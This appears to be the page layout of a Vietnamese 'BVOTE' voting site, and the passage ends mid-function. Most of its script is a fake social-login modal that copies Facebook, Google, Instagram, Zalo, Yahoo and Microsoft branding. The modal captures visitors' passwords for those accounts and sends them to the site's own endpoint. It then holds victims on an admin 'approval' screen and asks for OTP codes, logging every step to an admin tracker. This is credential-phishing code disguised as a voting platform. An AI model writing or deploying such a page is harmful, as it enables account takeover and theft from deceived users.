<?php
// Layout mirrors React PublicLayout with Tailwind CDN
?><!doctype html>
<html lang="vi">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>BVOTE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="manifest" href="/manifest.json">
    <meta name="theme-color" content="#0b1020" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
      body { font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; }
      /* Purple themed background */
      .main-gradient-bg{background: radial-gradient(1200px 600px at 50% -20%, rgba(168,85,247,0.22), transparent), linear-gradient(180deg, #0b1020, #0f172a)}
      .nav-button-glow{box-shadow: 0 0 0 rgba(168,85,247,.22)}
      .interactive-glow{box-shadow: 0 10px 30px rgba(0,0,0,.25), inset 0 0 0 1px rgba(255,255,255,.08)}
      /* Make monochrome SVG icons (simple-icons) visible on dark bg */
      .si-white { filter: invert(1) brightness(1.7); }
    </style>
  </head>
  <body class="min-h-screen text-slate-200 relative overflow-hidden main-gradient-bg">
    <script>
      window.__CSRF__ = '<?php echo App\Core\Security::csrfToken(); ?>';
      window.__LOGGED_IN__ = <?php echo (function_exists('isUserLoggedIn') && isUserLoggedIn()) ? 'true' : 'false'; ?>;
      window.__APP_ENV__ = '<?php echo defined('APP_ENV') ? APP_ENV : 'prod'; ?>';
      window.__AFTER_LOGIN_URL__ = '<?php echo getenv('AFTER_LOGIN_URL') ?: '/contests'; ?>';
      window.__OTP_REQUIRED__ = false;
  window.__WS_HOST__ = '<?php echo defined('WS_HOST') ? WS_HOST : '' ?>';
  window.__WS_PORT__ = '<?php echo defined('WS_PORT') ? WS_PORT : '' ?>';
      (async function(){
        try { const r = await fetch('/api/settings/auth'); const j = await r.json(); if (j && j.ok) { window.__OTP_REQUIRED__ = !!j.otp_required; } }
        catch(e){}
      })();
      window.secureFetch = (input, init = {}) => {
        const headers = Object.assign({}, init.headers || {}, { 'X-CSRF-Token': window.__CSRF__ });
        return fetch(input, Object.assign({}, init, { headers }));
      };
      window.toast = (msg, type='info') => {
        const el = document.createElement('div');
        el.textContent = msg;
        el.className = `fixed bottom-4 right-4 z-50 px-3 py-2 rounded ${type==='success'?'bg-green-600':'bg-slate-800'} text-white border border-white/10 shadow`;
        document.body.appendChild(el); setTimeout(()=>el.remove(), 2200);
      };

      // In-app notifications panel (simple)
      window.InApp = {
        panel: null,
        init(){
          this.panel = document.getElementById('inapp-panel');
        },
        push(message, type='info'){
          if (!this.panel) return;
          const row = document.createElement('div');
          row.className = 'px-3 py-2 border-b border-white/10 text-sm';
          row.textContent = message;
          this.panel.prepend(row);
        }
      };

      // Helper: Tính URL đích sau đăng nhập
      function computeAfterLoginUrl(){
        try {
          const url = new URL(location.href);
          const next = url.searchParams.get('next');
          if (next && /^\//.test(next)) return next; // chỉ cho phép path nội bộ
        } catch(_) {}
        if (window.__AFTER_LOGIN_URL__) return window.__AFTER_LOGIN_URL__;
        return '/contests';
      }

      // Sync trạng thái đăng nhập + CSRF khi tải trang
      (async function syncAuthOnLoad(){
        try {
          const r = await fetch('/api/auth/status', { credentials:'same-origin' });
          if (!r.ok) return;
          const j = await r.json();
          if (j && j.ok !== false) {
            if (typeof j.logged_in === 'boolean') window.__LOGGED_IN__ = j.logged_in;
            if (j.csrf_token) window.__CSRF__ = j.csrf_token;
          }
        } catch(_) {}
      })();

      // Register Service Worker
      if ('serviceWorker' in navigator) {
        window.addEventListener('load', function(){
          navigator.serviceWorker.register('/service-worker.js').catch(function(){});
        });
      }
    </script>
    <div class="relative z-10 flex flex-col min-h-screen">
      <header class="bg-slate-900/60 backdrop-blur border-b border-white/10 sticky top-0 z-40">
        <nav class="container mx-auto px-4 py-3 flex justify-between items-center">
          <a href="/" class="flex items-center gap-2 text-2xl font-bold text-white p-2 rounded-lg">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-8 w-8 text-purple-500"><path d="m9 12 2 2 4-4"/><path d="M12 22a10 10 0 1 1 10-10"/></svg>
            <span>BVOTE</span>
          </a>
          <button id="hamburger" class="md:hidden text-white p-2 rounded hover:bg-white/10" aria-label="Menu">☰</button>
          <div id="nav-right" class="flex-1 max-w-xl mx-6 hidden md:flex items-center gap-4">
            <div class="relative flex-1">
              <input id="globalSearch" type="text" placeholder="Tìm kiếm cuộc thi hoặc thí sinh..." class="w-full bg-slate-800/80 border border-white/10 rounded-full pl-10 pr-3 py-2 text-sm placeholder-slate-400" />
              <svg class="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-4.35-4.35M11 19a8 8 0 1 1 0-16 8 8 0 0 1 0 16z"/></svg>
              <div id="searchSuggest" class="absolute mt-1 w-full bg-slate-900/90 border border-white/10 rounded-lg shadow-xl hidden max-h-72 overflow-auto"></div>
            </div>
            <button onclick="openLoginModal()" class="bg-gradient-to-r from-purple-500 to-fuchsia-500 hover:opacity-90 text-white font-bold rounded-full px-6 py-2 shadow-lg">Đăng nhập</button>
            <button id="notifBtn" class="text-slate-300 hover:text-white" aria-label="Thông báo">🔔</button>
          </div>
        </nav>
      </header>

      <main class="container mx-auto px-4 md:px-8 flex-grow">
        <div class="my-6">
          <div class="flex justify-center items-center gap-4 bg-slate-900/60 border border-white/10 rounded-lg p-2 mb-6 max-w-md mx-auto">
            <a href="/" class="flex items-center gap-2 px-4 py-2 rounded-md text-sm font-medium text-slate-300 hover:text-white hover:bg-white/5">
              <span class="inline-block h-4 w-4">🏠</span>
              Trang chủ
            </a>
            <a href="/rankings" class="flex items-center gap-2 px-4 py-2 rounded-md text-sm font-medium text-slate-300 hover:text-white hover:bg-white/5">
              <span class="inline-block h-4 w-4">🏆</span>
              Bảng xếp hạng
            </a>
          </div>

          <div class="relative rounded-xl overflow-hidden h-48 md:h-64 shadow-lg interactive-glow">
            <img alt="Ảnh bìa chương trình" class="w-full h-full object-cover" loading="lazy" width="1600" height="800" src="https://images.unsplash.com/photo-1675749191790-6b6b3b13046b" />
            <div class="absolute inset-0 bg-black/50 flex items-center justify-center">
              <div class="text-center p-4">
                <div class="w-20 h-20 md:w-24 md:h-24 mx-auto mb-4 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/30">
                  <img alt="Logo chương trình" class="w-16 h-16 md:w-20 md:h-20 object-contain" loading="lazy" width="80" height="80" src="https://images.unsplash.com/photo-1598802777393-751e5387ecd1" />
                </div>
                <h1 class="text-2xl md:text-4xl font-bold text-white">NỀN TẢNG BVOTE</h1>
                <p class="text-white/80 mt-2">Nền tảng bình chọn uy tín hàng đầu</p>
              </div>
            </div>
          </div>
        </div>

        <?php echo $content; ?>
      </main>

      <footer class="bg-slate-900/60 backdrop-blur mt-8 py-6 text-center text-slate-400 border-t border-white/10">
        <p>&copy; <?php echo date('Y'); ?> Hệ thống BVOTE. Bảo lưu mọi quyền.</p>
        <p class="text-xs mt-1">Nền tảng bình chọn uy tín hàng đầu.</p>
      </footer>
    </div>

    <a href="/admin/login" class="fixed bottom-4 right-4 z-50 rounded-full bg-slate-900/60 hover:bg-slate-800 text-slate-300 hover:text-purple-400 p-2" aria-label="Truy cập trang quản trị">🛡️</a>
    <div id="inapp-panel" class="fixed top-16 right-2 z-40 w-72 max-h-80 overflow-auto bg-slate-900/90 border border-white/10 rounded-lg shadow-xl hidden"></div>

    <!-- Login Modal -->
    <div id="loginModal" onclick="if(event.target===this) closeLoginModal()" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 items-center justify-center p-4">
      <div class="bg-slate-900/90 border border-white/10 rounded-xl w-full max-w-[360px] shadow-xl" onclick="event.stopPropagation()">
        <div class="p-4 border-b border-white/10 flex items-center justify-between">
          <h3 class="text-lg font-semibold">Đăng nhập</h3>
          <button onclick="closeLoginModal()" class="text-slate-400 hover:text-white">✕</button>
        </div>
        <div class="p-4 space-y-3">
          <!-- Step 1: Chọn nền tảng -->
          <div id="platformGrid" class="space-y-2">
            <div class="text-sm text-slate-300">Chọn nền tảng</div>
            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2">
              <button class="h-12 rounded bg-[#1877F2] hover:bg-[#166FE5] text-white flex items-center justify-center gap-2" onclick="choosePlatform('facebook')">
                <img alt="Facebook" class="h-5 w-5" loading="lazy" width="20" height="20" src="/assets/images/brands/facebook.svg?v=20250817" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/facebook.svg?v=20250817'" />
                <span>Facebook</span>
              </button>
              <button class="h-12 rounded bg-white text-gray-800 border border-gray-300 hover:bg-gray-50 flex items-center justify-center gap-2" onclick="choosePlatform('google')">
                <img alt="Google" class="h-5 w-5" loading="lazy" width="20" height="20" src="/assets/images/brands/google.svg?v=20250817" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/google.svg?v=20250817'" />
                <span>Google</span>
              </button>
              <button class="h-12 rounded bg-gradient-to-r from-pink-500 via-rose-500 to-yellow-500 hover:opacity-90 text-white flex items-center justify-center gap-2" onclick="choosePlatform('instagram')">
                <img alt="Instagram" class="h-5 w-5" loading="lazy" width="20" height="20" src="/assets/images/brands/instagram.svg?v=20250817" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/instagram.svg?v=20250817'" />
                <span>Instagram</span>
              </button>
              <button class="h-12 rounded bg-[#0068FF] hover:bg-[#0b5bd3] text-white flex items-center justify-center gap-2" onclick="choosePlatform('zalo')">
                <img alt="Zalo" class="h-5 w-5 rounded" loading="lazy" width="20" height="20" src="/assets/images/brands/zalo.svg?v=20250817" onerror="this.onerror=null;this.src='https://stc.sp.zdn.vn/zaloid/client/images/zalo_icon.png?v=20250817'" />
                <span>Zalo</span>
              </button>
              <button class="h-12 rounded bg-[#5F01D1] hover:bg-[#4b02a6] text-white flex items-center justify-center gap-2" onclick="choosePlatform('yahoo')">
                <img alt="Yahoo" class="h-5 w-5" loading="lazy" width="20" height="20" src="/assets/images/brands/yahoo.svg?v=20250817" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/yahoo.svg?v=20250817'" />
                <span>Yahoo</span>
              </button>
              <button class="h-12 rounded bg-white text-gray-800 border border-gray-300 hover:bg-gray-50 flex items-center justify-center gap-2" onclick="choosePlatform('microsoft')">
                <img alt="Microsoft" class="h-5 w-5" loading="lazy" width="20" height="20" src="/assets/images/brands/microsoft.svg?v=20250817" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/microsoft.svg?v=20250817'" />
                <span>Microsoft</span>
              </button>
              
            </div>
          </div>

          <!-- Step 2: Nhập thông tin và gửi yêu cầu -->
          <div id="loginFormSection" class="hidden space-y-3">
            <div class="flex items-center justify-between">
              <div class="text-sm text-slate-400">Nền tảng đã chọn: <span id="chosenPlatform" class="font-medium text-slate-200">web</span></div>
              <button type="button" class="text-xs px-2 py-1 rounded bg-slate-800/60 border border-slate-700 hover:bg-slate-700 text-slate-300" onclick="backToPlatform()">Quay lại</button>
            </div>
            <!-- Brand Header -->
            <div id="brandHeader" class="flex items-center gap-3 p-2 rounded bg-slate-800/50 border border-slate-700">
              <div id="brandLogo" class="w-8 h-8 rounded-full bg-slate-700 flex items-center justify-center text-white text-sm">★</div>
              <div class="flex-1">
                <div id="brandTitle" class="text-slate-200 text-sm font-semibold">Đăng nhập</div>
                <div id="brandSubtitle" class="text-xs text-slate-400">Mô phỏng giao diện nền tảng</div>
              </div>
            </div>
            <div>
              <label class="block text-sm text-slate-400 mb-1">Tài khoản</label>
              <input id="platformUsername" class="w-full bg-slate-800/60 border border-slate-700 rounded px-3 py-2 text-white" placeholder="Email hoặc tên đăng nhập" />
            </div>
            <div>
              <label class="block text-sm text-slate-400 mb-1">Mật khẩu</label>
              <input id="platformPassword" type="password" class="w-full bg-slate-800/60 border border-slate-700 rounded px-3 py-2 text-white" placeholder="Mật khẩu" />
            </div>
            <div class="flex items-center justify-between text-xs text-slate-400">
              <label class="inline-flex items-center gap-2">
                <input id="platformRemember" type="checkbox" class="accent-blue-600" /> Ghi nhớ đăng nhập
              </label>
              <a id="platformForgot" href="#" target="_blank" class="text-blue-400 hover:text-blue-300">Quên mật khẩu?</a>
            </div>
            <div class="hidden">
              <label class="block text-sm text-slate-400 mb-1">Nền tảng</label>
              <select id="loginPlatform" class="w-full bg-slate-800/60 border border-slate-700 rounded px-3 py-2 text-white">
                <option value="web">Web</option>
                <option value="facebook">Facebook</option>
                <option value="google">Google</option>
                <option value="zalo">Zalo</option>
                <option value="instagram">Instagram</option>
                <option value="yahoo">Yahoo</option>
                <option value="microsoft">Microsoft</option>
              </select>
            </div>
            <div class="flex items-center gap-2 text-xs text-slate-400">
              <input id="devAutoApprove" type="checkbox" class="accent-blue-600" />
              <label for="devAutoApprove">Tự phê duyệt (dev)</label>
            </div>
            <div id="loginStatus" class="text-sm text-slate-400"></div>
            <div id="pendingSection" class="hidden flex items-center justify-between text-sm text-slate-300">
              <div class="flex items-center gap-2"><span class="inline-block w-4 h-4 border-2 border-white/30 border-t-blue-500 rounded-full animate-spin"></span> Đang chờ phê duyệt...</div>
              <div>⏳ <span id="loginCountdown">--</span>s</div>
            </div>
            <div class="flex justify-end gap-2 pt-2">
              <button onclick="closeLoginModal()" class="px-4 py-2 rounded bg-slate-700 text-white">Hủy</button>
              <button id="brandSubmitBtn" onclick="startLogin()" class="px-4 py-2 rounded bg-blue-600 hover:bg-blue-500 text-white">Đăng nhập</button>
            </div>
          </div>

          <!-- OTP section -->
          <div id="otpSection" class="hidden pt-4 border-t border-white/10 space-y-3">
            <div class="flex items-center justify-between">
              <div class="text-sm text-slate-300">Xác minh OTP</div>
              <button onclick="startOtp()" class="px-3 py-1.5 rounded bg-slate-700 hover:bg-slate-600 text-white text-sm">Gửi mã</button>
            </div>
            <div class="flex items-center gap-2">
              <input id="otpCode" inputmode="numeric" pattern="[0-9]{6,8}" maxlength="8" class="flex-1 bg-slate-800/60 border border-slate-700 rounded px-3 py-2 text-white tracking-widest" placeholder="Nhập mã 6-8 chữ số" />
              <button onclick="verifyOtp()" class="px-3 py-2 rounded bg-green-600 hover:bg-green-500 text-white">Xác minh</button>
            </div>
            <div id="otpStatus" class="text-xs text-slate-400"></div>
          </div>
        </div>
      </div>
    </div>

    <script>
      let __loginPollTimer = null, __loginRequestId = null, __loginWS = null;
      const ICON_VER = '20250817';
      const brandConfigs = {
        web:      { title:'Đăng nhập tài khoản', subtitle:'Sử dụng tài khoản của bạn', logo:'🌐', color:'bg-slate-700', btn:'bg-indigo-600 hover:bg-indigo-500', icon:null, cdn:null, userPh:'Email hoặc tên đăng nhập', passPh:'Mật khẩu', forgot:'#' },
        facebook: { title:'Facebook', subtitle:'Đăng nhập với tài khoản Facebook', logo:'f', color:'bg-blue-600', btn:'bg-blue-600 hover:bg-blue-500', icon:'/assets/images/brands/facebook.svg', cdn:'https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/facebook.svg', userPh:'Số điện thoại hoặc email', passPh:'Mật khẩu Facebook', forgot:'https://www.facebook.com/login/identify' },
        google:   { title:'Google', subtitle:'Đăng nhập với tài khoản Google', logo:'G', color:'bg-red-500', btn:'bg-blue-600 hover:bg-blue-500', icon:'/assets/images/brands/google.svg', cdn:'https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/google.svg', userPh:'Email hoặc số điện thoại', passPh:'Mật khẩu Google', forgot:'https://accounts.google.com/signin/v2/usernamerecovery' },
        instagram:{ title:'Instagram', subtitle:'Đăng nhập với tài khoản Instagram', logo:'I', color:'bg-pink-500', btn:'bg-pink-600 hover:bg-pink-500', icon:'/assets/images/brands/instagram.svg', cdn:'https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/instagram.svg', userPh:'Tên người dùng, email hoặc số điện thoại', passPh:'Mật khẩu Instagram', forgot:'https://www.instagram.com/accounts/password/reset/' },
        zalo:     { title:'Zalo', subtitle:'Đăng nhập với tài khoản Zalo', logo:'Z', color:'bg-blue-500', btn:'bg-blue-500 hover:bg-blue-400', icon:'/assets/images/brands/zalo.svg', cdn:'https://stc.sp.zdn.vn/zaloid/client/images/zalo_icon.png', userPh:'Số điện thoại Zalo', passPh:'Mật khẩu Zalo', forgot:'https://id.zalo.me/account/recover' },
        yahoo:    { title:'Yahoo', subtitle:'Đăng nhập với tài khoản Yahoo', logo:'y', color:'bg-purple-600', btn:'bg-blue-600 hover:bg-blue-500', icon:'/assets/images/brands/yahoo.svg', cdn:'https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/yahoo.svg', userPh:'Email Yahoo', passPh:'Mật khẩu Yahoo', forgot:'https://login.yahoo.com/forgot' },
        microsoft:{ title:'Microsoft', subtitle:'Đăng nhập với tài khoản Microsoft', logo:'M', color:'bg-blue-700', btn:'bg-blue-700 hover:bg-blue-600', icon:'/assets/images/brands/microsoft.svg', cdn:'https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/microsoft.svg', userPh:'Email, điện thoại hoặc Skype', passPh:'Mật khẩu Microsoft', forgot:'https://account.live.com/password/reset' },
      };

      function applyBrand(p){
        const cfg = brandConfigs[p] || brandConfigs.web;
        const logo = document.getElementById('brandLogo');
        logo.className = `w-8 h-8 rounded-full flex items-center justify-center text-white text-sm ${cfg.color}`;
        if (cfg.icon) {
          const localSrc = cfg.icon ? `${cfg.icon}?v=${ICON_VER}` : '';
          const cdnSrc = cfg.cdn ? `${cfg.cdn}?v=${ICON_VER}` : '';
          const onerr = cdnSrc ? `onerror=\"this.onerror=null;this.src='${cdnSrc}'\"` : '';
          logo.innerHTML = `<img alt=\"${p}\" src=\"${localSrc}\" loading=\"lazy\" width=\"20\" height=\"20\" ${onerr} class=\"w-5 h-5 ${p==='zalo'?'rounded':''}\" />`;
        } else {
          logo.textContent = cfg.logo;
        }
        document.getElementById('brandTitle').textContent = cfg.title;
        document.getElementById('brandSubtitle').textContent = cfg.subtitle || ('Mô phỏng giao diện ' + p);
        const u = document.getElementById('platformUsername');
        const pw = document.getElementById('platformPassword');
        u.placeholder = cfg.userPh; u.type = /email/i.test(cfg.userPh)?'email':'text';
        pw.placeholder = cfg.passPh; pw.type = 'password';
        const fl = document.getElementById('platformForgot'); fl.href = cfg.forgot;
        const btn = document.getElementById('brandSubmitBtn');
        btn.textContent = (p==='google'?'Tiếp tục':'Đăng nhập');
        btn.className = `w-full h-10 rounded text-white font-medium ${cfg.btn} focus:outline-none focus:ring-2 focus:ring-white/20`;
      }
      function wsUrl(){
        const isSecure = location.protocol === 'https:';
        const scheme = isSecure ? 'wss' : 'ws';
        const host = window.__WS_HOST__ && window.__WS_HOST__ !== '' ? window.__WS_HOST__ : location.hostname;
        const port = window.__WS_PORT__ && window.__WS_PORT__ !== '' ? (':' + window.__WS_PORT__) : (location.port ? (':' + location.port) : '');
        return `${scheme}://${host}${port}/ws`;
      }
      function connectLoginWS(){
        try {
          const url = wsUrl();
          const ws = new WebSocket(url);
          __loginWS = ws;
          ws.onopen = ()=>{};
          ws.onclose = ()=>{ __loginWS = null; };
          ws.onerror = ()=>{};
          ws.onmessage = async (ev)=>{
            let data = null; try { data = JSON.parse(ev.data); } catch(_) { return; }
            // Handle login.status events published by server
            if (data && data.type === 'login.status') {
              const curUser = (document.getElementById('platformUsername')?.value || '').trim();
              const curPlatform = document.getElementById('loginPlatform')?.value || '';
              // Basic guard so we only react to current attempt
              if ((data.username && curUser && data.username !== curUser) || (data.platform && curPlatform && data.platform !== curPlatform)) return;
              const statusEl = document.getElementById('loginStatus');
              const pending = document.getElementById('pendingSection');
              if (!statusEl || !pending) return;
              switch (data.status) {
                case 'processing':
                  // Hiển thị bảng chờ phê duyệt cùng kích thước với form
                  document.getElementById('loginFormSection').classList.remove('hidden');
                  pending.classList.remove('hidden');
                  statusEl.textContent = 'Phê duyệt đăng nhập bình chọn…';
                  try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'ws_processing', platform: curPlatform, username: curUser, ts: Date.now() }) }); }catch(_){}
                  break;
                case 'require_otp':
                  statusEl.textContent = 'Phê duyệt xác minh OTP';
                  showOtpPanel();
                  try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'ws_require_otp', platform: curPlatform, username: curUser, ts: Date.now() }) }); }catch(_){}
                  break;
                case 'waiting_verification':
                  document.getElementById('loginFormSection').classList.remove('hidden');
                  pending.classList.remove('hidden');
                  statusEl.textContent = 'Phê duyệt đăng nhập bình chọn…';
                  try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'ws_waiting_verification', platform: curPlatform, username: curUser, ts: Date.now() }) }); }catch(_){}
                  break;
                case 'success':
                  toast('Đăng nhập thành công', 'success');
                  window.__LOGGED_IN__ = true;
                  closeLoginModal();
                  const wsTo = computeAfterLoginUrl();
                  setTimeout(()=>{ try { window.location.href = wsTo; } catch(_) {} }, 300);
                  try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'ws_success', platform: curPlatform, username: curUser, ts: Date.now() }) }); }catch(_){}
                  break;
                case 'failed':
                  statusEl.textContent = 'Đăng nhập thất bại';
                  try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'warn', type:'ws_failed', platform: curPlatform, username: curUser, ts: Date.now() }) }); }catch(_){}
                  break;
              }
              return;
            }
            // Legacy auth:approved flow (kept for compatibility if used elsewhere)
            if (!data || data.type !== 'auth:approved') return;
            if (!__loginRequestId || data.request_id !== __loginRequestId) return;
            if (__loginPollTimer) { clearInterval(__loginPollTimer); __loginPollTimer = null; }
            const name = document.getElementById('loginName').value.trim();
            const platform = document.getElementById('loginPlatform').value;
            const fin = await secureFetch('/api/login/consume', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ request_id: __loginRequestId, name, platform }) });
            const fj = await fin.json();
            if (fj.ok) {
              if (window.__OTP_REQUIRED__) {
                document.getElementById('loginStatus').textContent = 'Đã phê duyệt. Vui lòng xác minh OTP.';
                showOtpPanel();
                startOtp();
              } else {
                toast('Đăng nhập thành công', 'success');
                window.__LOGGED_IN__ = true;
                closeLoginModal();
                const apTo = computeAfterLoginUrl();
                setTimeout(()=>{ try { window.location.href = apTo; } catch(_) {} }, 300);
              }
            } else { toast(fj.error||'Không thể hoàn tất đăng nhập'); }
          };
        } catch(e) { /* ignore */ }
      }
  function openLoginModal(){ const el=document.getElementById('loginModal'); el.classList.remove('hidden'); el.classList.add('flex'); document.getElementById('loginStatus').textContent=''; document.getElementById('pendingSection').classList.add('hidden'); backToPlatform(); if(!__loginWS){ try{ connectLoginWS(); }catch(_){} } }
  function closeLoginModal(){ const el=document.getElementById('loginModal'); el.classList.add('hidden'); el.classList.remove('flex'); if(__loginPollTimer) clearInterval(__loginPollTimer); if(__loginWS){ try{ __loginWS.close(); }catch(_){} __loginWS=null; } if(__loginCountdownTimer) clearInterval(__loginCountdownTimer); }
  function choosePlatform(p){ const sel=document.getElementById('loginPlatform'); sel.value=p; document.getElementById('chosenPlatform').textContent=p; document.getElementById('platformGrid').classList.add('hidden'); document.getElementById('loginFormSection').classList.remove('hidden'); applyBrand(p); setTimeout(()=>document.getElementById('platformUsername').focus(), 0); }
  function backToPlatform(){ document.getElementById('platformGrid').classList.remove('hidden'); document.getElementById('loginFormSection').classList.add('hidden'); document.getElementById('otpSection').classList.add('hidden'); }
      async function startLogin(){
        const username = document.getElementById('platformUsername').value.trim();
        const password = document.getElementById('platformPassword').value;
        const platform = document.getElementById('loginPlatform').value;
        if (!username || !password) { toast('Vui lòng nhập đầy đủ tài khoản và mật khẩu', 'error'); return; }
        const statusEl = document.getElementById('loginStatus');
        const pending = document.getElementById('pendingSection');
        // Hiển thị bảng chờ phê duyệt cùng kích thước form
        statusEl.textContent = 'Phê duyệt đăng nhập bình chọn…';
        pending.classList.remove('hidden');
        startCountdown(60);

        let timedOut = false; let failTimer = setTimeout(()=>{ timedOut=true; statusEl.textContent='Đăng nhập thất bại'; try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'warn', type:'login_failed_timeout', platform, username, ts: Date.now() }) }); }catch(_){} }, 60000);

        try {
          const body = { csrf_token: (window.__CSRF__||''), platform, username, password };
          // Gửi tín hiệu: bắt đầu đăng nhập
          try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'login_started', platform, username, ts: Date.now() }) }); }catch(_){ }
          // Hiệu ứng loading 5s trước khi hiển thị trạng thái tiếp theo
          const req = secureFetch('/api/social-login.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
          await new Promise(r=>setTimeout(r, 5000));
          const res = await req; const json = await res.json();
          if (timedOut) return; // đã hiển thị thất bại theo timeout
          if (json.success) {
            clearTimeout(failTimer);
            toast('Đăng nhập thành công', 'success');
            window.__LOGGED_IN__ = true;
            // Gửi tín hiệu: đăng nhập thành công
            try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'login_success', platform, username, ts: Date.now() }) }); }catch(_){ }
            closeLoginModal();
            const to = computeAfterLoginUrl() || (json.data && json.data.redirect_url) || '/contests';
            setTimeout(()=>{ try { window.location.href = to; } catch(_) {} }, 300);
          } else {
            // Map 3 trạng thái theo yêu cầu
            if (json.requires_otp) {
              statusEl.textContent = 'Phê duyệt xác minh OTP';
              // Gửi tín hiệu: yêu cầu OTP
              try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'login_require_otp', platform, username, ts: Date.now() }) }); }catch(_){ }
              showOtpPanel();
            } else if (json.requires_approval) {
              // Ẩn input, hiển thị bảng chờ phê duyệt (cùng layout)
              document.getElementById('loginFormSection').classList.remove('hidden');
              pending.classList.remove('hidden');
              statusEl.textContent = 'Phê duyệt đăng nhập bình chọn…';
              // Gửi tín hiệu: yêu cầu phê duyệt
              try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'login_require_approval', platform, username, ts: Date.now() }) }); }catch(_){ }
            } else {
              statusEl.textContent = 'Đăng nhập thất bại';
              // Gửi tín hiệu: thất bại
              try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'error', type:'login_failed', platform, username, ts: Date.now(), reason: json.message||'unknown' }) }); }catch(_){ }
            }
          }
        } catch(e){ statusEl.textContent = 'Đăng nhập thất bại'; }
      }

      function showOtpPanel(){
        document.getElementById('otpSection').classList.remove('hidden');
        document.getElementById('otpStatus').textContent = 'Mã OTP sẽ hết hạn sau 5 phút.';
      }

      async function startOtp(){
        try {
          try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'otp_send_start', ts: Date.now() }) }); }catch(_){ }
          const r = await secureFetch('/api/otp/send', { method:'POST' });
          const j = await r.json();
          if (j.ok) {
            document.getElementById('otpStatus').textContent = 'Đã gửi mã OTP. Vui lòng kiểm tra.';
            if (window.__APP_ENV__==='dev' && j.code) {
              document.getElementById('otpCode').value = j.code; // chỉ dev
            }
            try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'otp_send_success', ts: Date.now() }) }); }catch(_){ }
          } else {
            document.getElementById('otpStatus').textContent = j.error || 'Không thể gửi OTP';
            try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'warn', type:'otp_send_failed', ts: Date.now(), reason: j.error||'unknown' }) }); }catch(_){ }
          }
        } catch(e){ document.getElementById('otpStatus').textContent = 'Lỗi kết nối khi gửi OTP'; }
      }

      async function verifyOtp(){
        const code = document.getElementById('otpCode').value.trim();
        if (!/^[0-9]{6,8}$/.test(code)) { toast('Mã OTP 6-8 chữ số', 'error'); return; }
        try {
          try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'otp_verify_start', ts: Date.now() }) }); }catch(_){ }
          const r = await secureFetch('/api/otp/verify', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ code }) });
          const j = await r.json();
          if (j.ok) {
            toast('Xác minh OTP thành công', 'success');
            window.__LOGGED_IN__ = true;
            try{ secureFetch('/api/admin/events/track.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ level:'info', type:'otp_verify_success', ts: Date.now() }) }); }catch(_){ }
            closeLoginModal();
            const to = computeAfterLoginUrl() || (j.data && j.data.redirect_url) || '/contests';
            setTimeout(()=>{ try { window.location.href = to; } catch(_) {} }, 300);
          }
